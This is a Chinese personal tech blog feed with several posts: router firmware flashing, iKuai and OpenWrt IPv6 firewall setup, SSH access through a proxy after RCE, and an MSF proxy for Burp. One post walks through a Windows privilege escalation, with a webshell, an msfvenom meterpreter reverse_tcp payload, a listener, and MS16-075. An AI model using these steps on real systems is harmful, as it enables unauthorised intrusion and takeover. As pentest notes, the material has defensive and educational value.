<h4 id="连接ssh"><a href="#连接ssh" class="headerlink" title="连接ssh"></a>连接ssh</h4><p>配置ssh连接<code>127.0.0.2</code><br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-09-15.png"><br>配置用户名及公钥连接，公钥选择前面生成那个<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-12-19.png"><br>配置代理，使用上面neoreg构建的代理<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-10-38.png"><br>成功连接ssh<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-14-02.png"></p>
<h4 id="为什么连接127-0-0-2"><a href="#为什么连接127-0-0-2" class="headerlink" title="为什么连接127.0.0.2"></a>为什么连接127.0.0.2</h4><p>经过实践发现，通过代理连接目标主机的内网ip <code>172.xx.xx.33</code>连接不上，而连接<code>127.0.0.1</code>时则提示主机指纹改变的问题，需要重新写入指纹到目标主机才能连接，然而非root用户无法写入，连接<code>127.0.0.2</code>则完美避开问题<br><img data-src="/2021/11/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8ERCE%E5%88%B0SSH%E7%99%BB%E5%BD%95/2021-11-04-11-08-08.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>沛喆PZ-L8 TTL刷集客</title>
    <url>/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>移动宽带送的WIFI6 AX3000路由器，不用白不用，刷个集客AP固件跟小米CR8806凑成一组。</p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>刷前提示：刷机有风险，建议备份好分区。</p>
<p>刷入步骤其实跟CR8806极其相似，所以就把关键点说一下，其它的可以参考：<a href="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/">小米CR8806免拆TTL刷机</a></p>
<p>首先是拆开后盖，TTL接线，老规矩：<br>RXD -&gt; TXD<br>GND -&gt; GND<br>TXD -&gt; RXD</p>
<p><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-53-10.png"></p>
<p>插电后TTL开始滚屏，瞬间狂按esc，手速要快，基本要开机前2秒内完成，成功后会出现<code>IPQ5018#</code>字样：<br><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-10-22.png"></p>
<p>下面是分区表记录一下：<br><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-14-05.png"></p>
<p>网线连接路由器WAN口和电脑网口，把集客固件<code>ubi-JIKEAP_N3000.img </code>放置在TFTP服务器上，可以自行去官网下最新的，测试版本库有。</p>
<p>跟着恩山的教程刷入命令失败了，重启两次会变回原系统，后面照着小米CR8806的命令来刷成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setenv ipaddr 192.168.1.1</span><br><span class="line">setenv serverip 192.168.1.10  <span class="comment"># tftp服务器地址</span></span><br><span class="line">tftpboot ubi-JIKEAP_N3000.img </span><br><span class="line">flash rootfs_1</span><br><span class="line">setenv flag_try_sys2_failed 0 </span><br><span class="line">setenv flag_boot_rootfs 1</span><br><span class="line">setenv flag_last_success 1</span><br><span class="line">saveenv</span><br></pre></td></tr></table></figure>

<p><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-17-22.png"></p>
<p>完事拔电重启即可进入集客后台：<br><img data-src="/2023/05/03/%E6%B2%9B%E5%96%86PZ-L8-TTL%E5%88%B7%E9%9B%86%E5%AE%A2/2023-05-03-20-46-47.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.right.com.cn/forum/thread-8264479-1-1.html">https://www.right.com.cn/forum/thread-8264479-1-1.html</a></p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>爱快IPv6 ACL</title>
    <url>/2023/05/05/%E7%88%B1%E5%BF%ABIPV6-ACL/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>爱快iKuai8_3.7.0版本增加了IPv6的ACL支持，即爱快终于有IPv6的防火墙了，喜大普奔。本文记录一下爱快IPv6 ACL的测试、配置过程。</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>首先是配置一条公网入访问的拦截策略，默认拦截所有IPv6的公网入站请求，防止外部攻击。<br><img data-src="/2023/05/05/%E7%88%B1%E5%BF%ABIPV6-ACL/2023-05-05-12-31-58.png"></p>
<a id="more"></a>
<p>现在配置好了，测试一下效果，先把规则停用。<br><img data-src="/2023/05/05/%E7%88%B1%E5%BF%ABIPV6-ACL/2023-05-05-12-34-37.png"></p>
<p>然后使用Windows的远程桌面端口进行测试，真实可被公网访问的ip是我箭头所指的这个，临时IPv6是用来出站上网的，不能被公网访问，所以我们测试要用框框选中这个。<br><img data-src="/2023/05/05/%E7%88%B1%E5%BF%ABIPV6-ACL/2023-05-05-12-36-17.png"></p>
<p>然后在外部有IPv6的VPS上面使用nmap探测3389：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -6 2409:xxx::1026 -p 3389 -Pn -n</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/05/05/%E7%88%B1%E5%BF%ABIPV6-ACL/2023-05-05-12-38-46.png"></p>
<p>端口是开放的，所以默认情况下，我们在IPv6是裸奔，然后再把策略启用，重新测试。</p>
<p><img data-src="/2023/05/05/%E7%88%B1%E5%BF%ABIPV6-ACL/2023-05-05-12-42-07.png"><br>可以看到端口是可以访问了，规则生效。<br><img data-src="/2023/05/05/%E7%88%B1%E5%BF%ABIPV6-ACL/2023-05-05-12-43-47.png"></p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>在正式开始配置之前，我们需要牢记爱快的规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">冲突时允许的优先级高于阻断的优先级。</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/05/05/%E7%88%B1%E5%BF%ABIPV6-ACL/2023-05-05-12-55-14.png"></p>
<p>所以我们在配置完上面的阻断规则后，再针对自己需求配置允许的规则即可。</p>
<p>但是IPv6地址会经常变化，如何针对某个v6地址做策略呢？</p>
<p>在IPv6中，与IPv4的子网掩码类似，也有一个称为“前缀长度”的概念，用于指示网络地址的范围。而“负掩码”则是由前缀长度计算出来的。负掩码是一个二进制数，它的高位是1，低位是0，并且包含了地址的前缀。负掩码可以用来确定一个地址的网络地址部分（即前缀），并将其与其他IPv6地址进行比较。</p>
<p>例如，假设一个IPv6地址为2001:0db8:85a3:0000:0000:8a2e:0370:7334/64，其中“/64”表示这个地址的前缀长度为64位。那么，这个地址的负掩码就是一个长度为128位的二进制数，其中前64位为1，后64位为0。</p>
<p>负掩码的主要作用是用于IPv6地址的路由选择。通过比较负掩码，路由器可以将数据包转发到目标地址所属的正确网络。</p>
<p>说人话，简单点就是，比如<code>2400:a1:b1:c1::abc</code>中，<code>2400:a1:b1:c1</code>是会变动的，但是<code>::abc</code>不会变化，所以匹配它的写法是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">::abc&#x2F;::ffff:ffff:ffff:ffff</span><br></pre></td></tr></table></figure>

<p>比如我有个OPENVPN服务，根据下图的配置访问可允许公网IPv6访问VPN的端口。<br><img data-src="/2023/05/05/%E7%88%B1%E5%BF%ABIPV6-ACL/2023-05-05-13-15-56.png"></p>
<p>上面这种地址在类Unix设备上比较常见，在Windows下的话，公网的IPv6会长一些，但是写法是一样，比如公网IPv6 <code>2400:a1:b1:c1:aaaa:bbbb:cccc:dddd</code>，匹配它的写法是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">::aaaa:bbbb:cccc:dddd&#x2F;::ffff:ffff:ffff:ffff</span><br></pre></td></tr></table></figure>

<p>如果你有下载需要，建议开放TCP+UDP的<code>16881</code>、<code>6881</code>端口。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文讲述了爱快的IPv6 ACL配置方法，希望对你有所帮助。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.ikuai8.com/index.php?option=com_content&amp;view=article&amp;id=192&amp;Itemid=312">https://www.ikuai8.com/index.php?option=com_content&amp;view=article&amp;id=192&amp;Itemid=312</a><br><a href="https://www.jianshu.com/p/c762ead45eb2">https://www.jianshu.com/p/c762ead45eb2</a></p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>爱快主路由下IPV6防火墙的最优解（可能）</title>
    <url>/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong><br>2023.5.4 更新：<br>2023-03-21，爱快官方iKuai8_3.7.0以上版本已更新ipv6 ACL支持，使用官方ACL成为最优解。</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在ipv6网络环境下，内网设备也获取到公网的ipv6地址，可直接被外部网络访问，形同裸奔，所以使用ipv6防火墙是很有必要的。</p>
<p>爱快的流控、人性化的界面与配置，是我使用爱快作为主路由的主要原因，但是不支持ipv6防火墙，内网设备在ipv6下裸奔，也是爱快受人诟病的一大缺陷。在家庭网络中，如何在爱快作为主路由的环境下，增加ipv6防火墙的问题，我想了很久，搜索了大量的资料，中间考虑过很多方案。其实要做到增加防火墙的方法很多，比如使用openwrt作为主路由自带防火墙、opensense，或是使用内网主机自带的防火墙。考虑过使用openwrt作为主路由，但是openwrt在折腾中诡异的问题实在太多，而且流控、界面展示、客户端控制、人性化的操作等多方面都不符合我的个人审美与需求。m0n0wall、opnsense之类的防火墙固件的话因为想到为了一个防火墙功能而额外消耗比较多的硬件资源且接入上去对网络结构有比较大的改动所以放弃了。最终，想到了一个相对优雅且对现有网络结构影响较小的方案。</p>
<p>本教程不太适合小白，小白也不太能理解ipv6防火墙的重要性。</p>
<h3 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h3><p>我们知道，openwrt自带了ipv6的防火墙，那么使用爱快作为ipv4网关，openwrt作为ipv6网关，就可以实现需求。<br>下面来揭晓我的方案:</p>
<ul>
<li>在爱快创建一个vlan接口，并在该接口启用ipv6，同时停用爱快lan口的ipv6服务</li>
<li>通过vlan，复用内网LAN线路作为openwrt与爱快间的ipv6桥梁</li>
<li>openwrt 充当内网lan ipv6网关</li>
<li>openwrt 配置ipv6防火墙</li>
</ul>
<p>示例图如下：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-12-38-56.png"></p>
<p>最终流量走向示例如下：<br>ipv4: client1(192.168.5.101) -&gt; ikuai lan(192.168.5.1) -&gt; ikuai wan(Internet)<br>ipv6: client1(2400:xxxx:a1::101) -&gt; openwrt lan(2400:xxxx:a1::1) -&gt; openwrt wan(dhcpv6 client) -&gt; ikuai lan(dhcpv6 server) -&gt; ikuan wan(Internet ipv6)</p>
<p>可以看到，ipv6流量先经过openwrt再经过ipv6，然后我们在openwrt上面配置ipv6防火墙就可以了。</p>
<a id="more"></a>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><h4 id="爱快配置"><a href="#爱快配置" class="headerlink" title="爱快配置"></a>爱快配置</h4><p>首先是爱快主路由的配置，lan1是内网网口：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-19-46.png"></p>
<p>在vlan设置中，添加一个vlan，这里使用vlan号101，线路选择lan1，不要设置ipv4地址，因为是纯ipv6网络：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-23-11.png"></p>
<p><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-24-08.png"></p>
<p><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-25-30.png"></p>
<p>然后配置vlan101口的ipv6服务。需要确保在ipv6设置中外网接口能获取到公网v6地址，且获取到ipv6前缀，正常桥接光猫并正确拨号后会自动获取到：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-35-41.png"><br>前缀这里需要小于64，否则在openwrt就无法下发ipv6地址：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-36-42.png"></p>
<h4 id="openwrt-ipv6配置"><a href="#openwrt-ipv6配置" class="headerlink" title="openwrt ipv6配置"></a>openwrt ipv6配置</h4><p>接下来配置openwrt，为了方便，我的openwrt配置了2个网口，都是绑定了内网lan口：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-26-51.png"><br>openwrt作为ipv4旁路由，相信大家都会，不细说了，配置好之后可开始配置v6，不配置也行。<br>然后修改wan6配置：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-28-45.png"><br>把协议切换为dhcpv6客户端，如何没有的，请自行查询安装ipv6（主要是ipv6-helper）方法或更换固件：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-30-34.png"><br>不要勾选”使用内置的 IPv6 管理”：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-32-53.png"><br>配置为桥接接口，并连接到vlan101。具体操作是，在<code>自定义接口</code>中输入<code>eth1.101</code>代表连接到<code>eth1</code>网口的<code>VLAN 101</code>：：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-33-27.png"><br>防火墙区域设置为wan：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-13-34-02.png"></p>
<p>保存后会自动重启接口，此时wan6应该能获取到ipv6地址及pd前缀，正常的话lan口也应该获取到ipv6地址：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-16-01-18.png"></p>
<p>然后配置lan口的dhcpv6服务，内网设备即可获取到ipv6地址：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-23-20-51-01.png"></p>
<p>然而博主的lan口经过多方配置，也无法获取到ipv6地址，内网设备也无法获取到公网的ipv6地址，网上很多教程是改成中继模式的并不符合本人的需求。</p>
<p>最终，通过把wan6获取到的pd前缀，写入lan口的ipv6地址，才解决了问题，内网设备、lan口都有公网的ipv6地址，也能正常访问ipv6网络。<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-16-09-54.png"></p>
<p>但这样有个问题，运营商给的ipv6 pd前缀是会变的，会导致后面内网设备无法上网，所以需要想个办法把最新的pd前缀应用到lan接口去，这里使用crontab：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* * * * * newpd=`ifstatus wan6|jq <span class="string">&#x27;.[&quot;ipv6-prefix&quot;][0]&#x27;</span> | jq -r   <span class="string">&#x27;&quot;\(.address)\/\(.mask)&quot;&#x27;</span>`;lan_v6=`ifstatus lan|jq <span class="string">&#x27;.[&quot;ipv6-address&quot;][0]&#x27;</span> | jq -r   <span class="string">&#x27;&quot;\(.address)\/\(.mask)&quot;&#x27;</span>`;<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$newpd</span>&quot;</span> != <span class="string">&quot;<span class="variable">$lan_v6</span>&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$newpd</span>&quot;</span> != <span class="string">&quot;null/null&quot;</span> ]];<span class="keyword">then</span> uci <span class="built_in">set</span> network.lan.ip6addr=<span class="variable">$newpd</span>;uci commit network;service network restart;<span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<p>把上面的命令直接写入计划任务即可，如果lan口本身就能获取到ipv6地址的则不需要这个步骤。<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-16-15-54.png"></p>
<h4 id="openwrt-防火墙配置"><a href="#openwrt-防火墙配置" class="headerlink" title="openwrt 防火墙配置"></a>openwrt 防火墙配置</h4><p>如果需要开放某些ipv6端口允许公网访问，可配置防火墙策略。<br>以bt下载（16881端口）为例：<br>打开防火墙 -&gt; 通信规则 -&gt; 新建转发规则，输入规则名，点击添加并编辑：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-16-19-51.png"></p>
<p><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-16-21-39.png"><br>然后保存并应用即可：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-22-16-23-16.png"></p>
<p>防火墙效果如下，关闭策略时可访问内网设备的3389端口，启用策略后3389端口禁止访问：<br><img data-src="/2023/02/22/%E7%88%B1%E5%BF%AB%E4%B8%BB%E8%B7%AF%E7%94%B1%E4%B8%8BIPV6%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E6%9C%80%E4%BC%98%E8%A7%A3/2023-02-23-20-56-01.png"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>ipv6 防火墙实现的方法很多种，本文只是介绍一种相对简单的方式，希望能帮助到遇到相同难题的人。</p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次Windows提权过程</title>
    <url>/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-10-21.png"></p>
<h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </span><br></pre></td></tr></table></figure>

<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp  </span><br><span class="line">set LHOST x.x.x.x  </span><br><span class="line">set LPORT xx  </span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="通过webshell上传并执行木马"><a href="#通过webshell上传并执行木马" class="headerlink" title="通过webshell上传并执行木马"></a>通过webshell上传并执行木马</h3><p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-11-37.png"></p>
<h3 id="msf接收到会话"><a href="#msf接收到会话" class="headerlink" title="msf接收到会话"></a>msf接收到会话</h3><p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-12-59.png"></p>
<h3 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid  </span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-14-15.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use incognito   </span><br><span class="line">list_tokens -u  </span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-19-47.png"></p>
<h3 id="查找可利用的提权exp"><a href="#查找可利用的提权exp" class="headerlink" title="查找可利用的提权exp"></a>查找可利用的提权exp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester  </span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-11.png"></p>
<h3 id="把当前msf回话放到后台，并记住其session值为5"><a href="#把当前msf回话放到后台，并记住其session值为5" class="headerlink" title="把当前msf回话放到后台，并记住其session值为5"></a>把当前msf回话放到后台，并记住其session值为5</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bg  </span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-36.png"></p>
<h3 id="利用ms16-075得到system权限"><a href="#利用ms16-075得到system权限" class="headerlink" title="利用ms16_075得到system权限"></a>利用ms16_075得到system权限</h3><p><img data-src="/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-50.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>让BurpSuite使用MSF的socks4a代理</title>
    <url>/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在使用msf转发流量时遇到了个问题，就是使用auxiliary/server/socks4a做代理时，burpsuite不支持socks4a代理，导致无法使用burp去抓包。而使用auxiliary/server/socks5做代理却失败了，可能是脚本的bug，官方issues也有人反馈这个问题。</p>
<h3 id="具体问题"><a href="#具体问题" class="headerlink" title="具体问题"></a>具体问题</h3><h4 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h4><p>我所在的环境比较特殊，工作机（192.168.1.2，Windows）位于A地内网，MSF机器（172.16.1.2，Linux）位于B地内网，两内网不相通，但是可以通过11.11.11.11:22 SSH访问MSF机器，遂用SSH隧道将172.16.1.2:11080端口转发到工作机的127.0.0.1:1083端口，如果不清楚这个操作，可以理解为工作机访问本机127.0.0.1:1083端口等价于访问MSF机172.16.1.2:11080端口。<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-43-50.png"></p>
<a id="more"></a>
<h4 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h4><ol>
<li>在MSF机器启动socks4a代理（前面获取反弹shell、设置路由的步骤略过）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; use auxiliary&#x2F;server&#x2F;socks4a </span><br><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; set SRVPORT 11080</span><br><span class="line">msf5 auxiliary(server&#x2F;socks4a) &gt; exploit</span><br></pre></td></tr></table></figure>
<img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-44-36.png"></li>
<li>在配置代理前，我的ip地址是A地公网ip<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-44-49.png"></li>
<li>使用Firefox配置代理测试转发是否正常，这时ip由联通变成电信了，证明代理转发隧道工作正常<br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-45-05.png"><br><img data-src="/2019/07/11/%E8%AE%A9BurpSuite%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/2020-08-19-18-45-14.png"></li>
